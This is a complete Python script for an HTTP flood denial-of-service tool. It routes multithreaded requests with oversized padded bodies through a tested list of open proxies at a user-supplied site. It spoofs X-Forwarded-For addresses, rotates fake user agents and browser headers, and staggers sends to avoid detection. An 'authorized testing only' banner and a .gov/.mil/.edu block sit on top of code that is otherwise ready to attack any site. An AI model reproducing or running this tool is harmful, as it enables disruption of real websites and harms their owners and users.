import socket
import threading
import string
import random
import time
import os
import platform
import sys
import select
import ssl
import logging
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
try:
    from colorama import Fore, init
    from fake_useragent import UserAgent
    init(autoreset=True)
except ModuleNotFoundError as e:
    print(f"Error: {e}. Please install colorama and fake_useragent using 'pip install colorama fake_useragent'")
    exit()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

stop_attack = threading.Event()
success_count = 0
total_bytes_sent = 0
ssl_failures = 0
proxy_failures = 0
active_proxies = []
proxy_lock = threading.Lock()
ua = UserAgent()

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random URL path
def generate_url_path():
    endpoints = [
        f"api/v{random.randint(1, 3)}/{random.choice(['user', 'product', 'cart', 'order'])}/{generate_random_string(8)}",
        f"blog/post/{generate_random_string(12)}",
        f"search?q={generate_random_string(10)}",
        f"assets/js/{generate_random_string(12)}.js",
        f"content/{random.choice(['article', 'page'])}/{random.randint(100, 999)}",
    ]
    return random.choice(endpoints)

# Generate random string
def generate_random_string(length):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# Generate large payload
def generate_large_payload(size=1024):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

# Generate random IP for X-Forwarded-For
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Load and test proxies
def load_proxies(filename="ProxyList.txt", target_ip=None, target_port=None):
    global active_proxies
    try:
        with open(filename, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxies)} proxies from {filename}")
        active_proxies = []
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(test_proxy, proxy, target_ip, target_port) for proxy in proxies]
            for future in futures:
                future.result()
        logging.info(f"Found {len(active_proxies)} active proxies")
        if not active_proxies:
            logging.error("No active proxies found. Exiting...")
            sys.exit(1)
    except FileNotFoundError:
        logging.error(f"{filename} not found")
        sys.exit(1)

def test_proxy(proxy, target_ip=None, target_port=None):
    ip, port = proxy.split(':')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((ip, int(port)))
        if target_ip and target_port:
            connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n".encode()
            s.sendall(connect_request)
            response = s.recv(4096).decode()
            if "200 Connection established" not in response:
                raise ConnectionError("Proxy failed to establish connection")
        with proxy_lock:
            active_proxies.append(proxy)
        logging.debug(f"Proxy {proxy} is active")
    except (socket.error, ValueError, ConnectionError):
        logging.debug(f"Proxy {proxy} failed")
    finally:
        s.close()

# Get random proxy
def get_random_proxy():
    with proxy_lock:
        return random.choice(active_proxies) if active_proxies else None

# Header lists for randomization
accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json,text/plain,*/*",
    "*/*",
]
accept_languages = ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"]
accept_encodings = ["gzip, deflate, br", "gzip, deflate", "br"]
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    f"https://{random.choice(['example.com', 'test.com', 'dummy.com'])}/",
]
content_types = ["application/x-www-form-urlencoded", "multipart/form-data", "application/json"]
origins = [f"https://{random.choice(['example.com', 'test.com', 'dummy.com'])}"]
sec_ch_ua = [
    '"Google Chrome";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
    '"Firefox";v="121", "Gecko";v="20100101"',
]

# Attack logic
def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False, retry_count=2):
    global success_count, total_bytes_sent, ssl_failures, proxy_failures
    if stop_attack.is_set():
        return
    url_path = generate_url_path()
    attempts = 0
    while attempts <= retry_count and not stop_attack.is_set():
        proxy = get_random_proxy()
        if not proxy:
            logging.error("No active proxies available")
            return
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(45)  # 45s timeout for proxy and HTTPS
        if use_ssl:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.set_ciphers('TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or higher
            s = context.wrap_socket(s, server_hostname=host)
        try:
            proxy_ip, proxy_port = proxy.split(':')
            s.connect((proxy_ip, int(proxy_port)))
            connect_request = f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode()
            s.sendall(connect_request)
            response = s.recv(4096).decode()
            if "200 Connection established" not in response:
                raise ConnectionError(f"Proxy {proxy} failed to establish connection")
            payload_patterns = {
                'BASIC': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 1024\n\n"
                    f"{generate_large_payload(1024)}"
                ),
                'MEDIUM': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 8192\n\n"
                    f"{generate_large_payload(8192)}"
                ),
                'INSANE': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 32768\n\n"
                    f"{generate_large_payload(32768)}"
                ),
                'EXTREME': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 65536\n\n"
                    f"{generate_large_payload(65536)}"
                ),
                'ULTIMATE': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 131072\n\n"
                    f"{generate_large_payload(131072)}"
                ),
                'GODLIKE': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 262144\n\n"
                    f"{generate_large_payload(262144)}"
                ),
                'TITAN': (
                    f"{type_attack} /{url_path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Connection: keep-alive\n"
                    f"User-Agent: {ua.random}\n"
                    f"Accept: {random.choice(accepts)}\n"
                    f"Accept-Language: {random.choice(accept_languages)}\n"
                    f"Accept-Encoding: {random.choice(accept_encodings)}\n"
                    f"Referer: {random.choice(referers)}\n"
                    f"Origin: {random.choice(origins)}\n"
                    f"Cookie: session={generate_random_string(16)}; token={generate_random_string(32)}\n"
                    f"Sec-Ch-Ua: {random.choice(sec_ch_ua)}\n"
                    f"Sec-Fetch-Site: cross-site\n"
                    f"Sec-Fetch-Mode: navigate\n"
                    f"Sec-Fetch-Dest: document\n"
                    f"DNT: 1\n"
                    f"X-Forwarded-For: {generate_random_ip()}\n"
                    f"Upgrade-Insecure-Requests: 1\n"
                    f"Content-Type: {random.choice(content_types)}\n"
                    f"Content-Length: 524288\n\n"
                    f"{generate_large_payload(524288)}"
                ),
            }
            packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
            sent_bytes = 0
            for _ in range(booster_sent):
                if stop_attack.is_set():
                    break
                s.sendall(packet_data)
                sent_bytes += len(packet_data)
                time.sleep(random.uniform(0.1, 2.0))  # Random delay to mimic human behavior
            with proxy_lock:
                success_count += 1
                total_bytes_sent += sent_bytes
            logging.info(f"Successful connection via {proxy}: Sent {sent_bytes / 1024:.2f} KB to {ip}:{port}")
            break
        except (ssl.SSLEOFError, ssl.SSLZeroReturnError, ssl.SSLWantReadError) as e:
            with proxy_lock:
                ssl_failures += 1
            logging.error(f"SSL error on {ip}:{port} via {proxy}: {type(e).__name__} - {str(e)}")
            attempts += 1
            if attempts > retry_count:
                with proxy_lock:
                    if proxy in active_proxies:
                        active_proxies.remove(proxy)
                        proxy_failures += 1
                logging.warning(f"Proxy {proxy} removed due to repeated SSL failures")
        except (ConnectionError, TimeoutError, socket.gaierror) as e:
            with proxy_lock:
                proxy_failures += 1
                if proxy in active_proxies:
                    active_proxies.remove(proxy)
            logging.error(f"Connection error on {ip}:{port} via {proxy}: {type(e).__name__} - {str(e)}")
            attempts += 1
        finally:
            s.close()

# Running attack with ThreadPoolExecutor
def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl):
    with ThreadPoolExecutor(max_workers=min(spam_loader, 10)) as executor:
        while time.time() < time_loader and not stop_attack.is_set():
            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
            for future in futures:
                future.result()

# Countdown + interrupt
def countdown_timer(time_loader):
    global total_bytes_sent, ssl_failures, proxy_failures
    start_time = time.time()
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        elapsed = time.time() - start_time
        traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
        sys.stdout.write(f"\r{Fore.YELLOW}Time: {remaining}s | Connections: {success_count} | SSL Failures: {ssl_failures} | Proxy Failures: {proxy_failures} | Proxies: {len(active_proxies)} | Traffic: {traffic_kbps:.2f} KB/s{Fore.RESET}")
        sys.stdout.flush()
        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Attack stopped by user{Fore.RESET}")
            return
        time.sleep(1)
        remaining = int(time_loader - time.time())
    if not stop_attack.is_set():
        traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
        print(f"\n{Fore.GREEN}Attack completed | Connections: {success_count} | SSL Failures: {ssl_failures} | Proxy Failures: {proxy_failures} | Proxies: {len(active_proxies)} | Total: {total_bytes_sent / 1024 / 1024:.2f} MB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
        stop_attack.set()

# Exit confirmation
def confirm_exit():
    while True:
        choice = input(f"{Fore.YELLOW}Exit program? (y/n): {Fore.RESET}").lower()
        if choice == 'y':
            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

# Validate URL and extract host, protocol
def validate_target(target):
    try:
        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
        host = parsed.hostname
        if not host:
            raise ValueError("Invalid URL")
        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
            raise ValueError("Attacking .gov, .mil, .edu, or .ac domains is prohibited")
        ip = socket.gethostbyname(host)
        return ip, host, parsed.scheme == 'https'
    except (ValueError, socket.gaierror) as e:
        logging.error(f"Target validation error: {e}")
        return None, None, None

# Main command loop
def command():
    global stop_attack, success_count, total_bytes_sent, ssl_failures, proxy_failures
    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
    ip, host, use_ssl = validate_target(input(f"{Fore.CYAN}Enter target URL (e.g., https://example.com): {Fore.RESET}"))
    if not ip:
        print(f"{Fore.RED}Invalid target. Exiting...{Fore.RESET}")
        sys.exit(1)
    load_proxies(target_ip=ip, target_port=443 if use_ssl else 80)
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                confirm_exit()
                continue

            args_get = data_input_loader.split()
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 9:
                    data_type_loader_packet = args_get[1].upper()
                    if data_type_loader_packet not in ['BASIC', 'MEDIUM', 'INSANE', 'EXTREME', 'ULTIMATE', 'GODLIKE', 'TITAN']:
                        print(f"{Fore.RED}TYPE_PACKET must be BASIC, MEDIUM, INSANE, EXTREME, ULTIMATE, GODLIKE, or TITAN{Fore.RESET}")
                        continue
                    try:
                        port_loader = int(args_get[2])
                        if not 1 <= port_loader <= 65535:
                            raise ValueError
                    except ValueError:
                        print(f"{Fore.RED}Port must be a number between 1-65535{Fore.RESET}")
                        continue
                    try:
                        time_loader = time.time() + int(args_get[3])
                    except ValueError:
                        print(f"{Fore.RED}TIME must be a number{Fore.RESET}")
                        continue
                    try:
                        spam_loader = int(args_get[4])
                        if spam_loader > 10000:
                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 10000 may overload your system. Proceed with caution.{Fore.RESET}")
                    except ValueError:
                        print(f"{Fore.RED}SPAM_THREAD must be a number{Fore.RESET}")
                        continue
                    try:
                        create_thread = int(args_get[5])
                        if create_thread > 10000:
                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 10000 may overload your system. Proceed with caution.{Fore.RESET}")
                    except ValueError:
                        print(f"{Fore.RED}CREATE_THREAD must be a number{Fore.RESET}")
                        continue
                    try:
                        booster_sent = int(args_get[6])
                    except ValueError:
                        print(f"{Fore.RED}BOOTER_SENT must be a number{Fore.RESET}")
                        continue
                    methods_loader = args_get[7]
                    try:
                        spam_create_thread = int(args_get[8])
                        if spam_create_thread > 10000:
                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 10000 may overload your system. Proceed with caution.{Fore.RESET}")
                    except ValueError:
                        print(f"{Fore.RED}SPAM_CREATE must be a number{Fore.RESET}")
                        continue

                    if not active_proxies:
                        print(f"{Fore.RED}No active proxies available. Please update ProxyList.txt{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    success_count = 0
                    total_bytes_sent = 0
                    ssl_failures = 0
                    proxy_failures = 0
                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {host}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}\nProxies: {len(active_proxies)}{Fore.RESET}")

                    for _ in range(create_thread):
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl)).start()

                    countdown_timer(time_loader)
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Command not found{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
